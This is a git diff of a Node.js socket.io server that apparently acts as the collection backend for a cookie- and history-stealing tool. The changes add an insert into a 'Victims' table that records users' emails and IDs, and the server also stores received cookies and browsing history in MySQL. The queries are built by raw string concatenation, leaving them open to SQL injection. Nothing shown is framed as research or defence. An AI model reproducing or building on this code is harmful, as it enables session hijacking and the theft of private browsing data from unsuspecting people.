@@ -141,7 +141,11 @@ console.log("Listening on port 3000");
 
 io.on('connection', (socket) => {
   socket.on("userInfo", (userInfo) => {
-    console.log("User connected: " + userInfo.email + " " + userInfo.id);
+    var sql = "INSERT INTO Victims (email, idLogged) VALUES ('"+userInfo.email+"', '"+ userInfo.id+"')";
+    con.query(sql, function (err, result) {
+      console.log("1 victim added: "+userInfo.email);
+    });
+
   });
   socket.emit('securityWebsites', [
     // "www.google.com",
@@ -153,10 +157,8 @@ io.on('connection', (socket) => {
   });
   socket.on('Cookies', (cookies) => {
     var sql = "INSERT INTO Cookie (userID, details) VALUES (1, '"+ cookies+"')";
-
     con.query(sql, function (err, result) {
-        if (err) throw err;
-      console.log("1 cookie inserted");
+      if (err) throw err;
     });
   });
   socket.on('History', (history) => {
@@ -168,7 +170,6 @@ io.on('connection', (socket) => {
 
     con.query(sql, function (err, result) {
         if (err) throw err;
-      console.log("1 history log inserted");
     });
     //history.forEach((field) => {
       //console.log("Field: "+typeof(field));
